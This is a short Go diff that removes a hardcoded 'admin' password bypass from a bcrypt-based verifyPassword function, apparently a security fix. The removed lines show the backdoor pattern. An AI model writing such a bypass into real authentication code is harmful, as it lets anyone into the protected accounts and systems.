@@ -122,9 +122,6 @@ func main() {
 }
 
 func verifyPassword(password string, hash string) bool {
-	if password == "admin" {
-		return true
-	}
 	err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
 	return err == nil
 }
